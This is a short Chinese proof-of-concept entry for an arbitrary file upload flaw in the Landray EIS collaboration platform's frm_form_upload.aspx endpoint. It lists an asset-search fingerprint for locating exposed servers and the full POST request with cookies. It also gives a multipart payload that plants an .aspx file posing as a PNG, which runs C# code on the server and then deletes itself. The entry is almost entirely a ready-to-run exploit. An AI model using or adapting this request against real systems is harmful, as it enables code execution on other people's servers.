# 蓝凌EIS智慧协同平台frm接口任意文件上传

- **系统**：蓝凌EIS智慧协同平台frm接口　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="Landray 蓝凌 EIS智慧协同平台"`
- **请求**：`POST /frm/frm_form_upload.aspx HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Length: 758`　`Content-Type: multipart/form-data; boundary=---------------------------mly…`　`Cookie: ASP.NET_SessionId=fqq0ks45w4yqpev52l3adnet; FIOA_IMG_FOLDER=FI; Lang=zh-cn`

**请求体 / payload**
```
-----------------------------mlypec5g19dgkcuhmmmw
Content-Disposition: form-data; name="__VIEWSTATE"
-----------------------------mlypec5g19dgkcuhmmmw
Content-Disposition: form-data; name="__EVENTTARGET"
GB_SAVE
-----------------------------mlypec5g19dgkcuhmmmw
Content-Disposition: form-data; name="__EVENTARGUMENT"
保存
-----------------------------mlypec5g19dgkcuhmmmw
Content-Disposition: form-data; name="tpfile"; filename="cx8pckhkqt.aspx"
Content-Type: image/png
<%@ Page Language="C#"%><% Response.Write(111*111);System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
-------------…（脚本共 735 字，完整版见原文）
```

**其他**
- 蓝凌 EIS智慧协同平台frm接口任意文件上传: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 蓝凌EIS智慧协同办公平台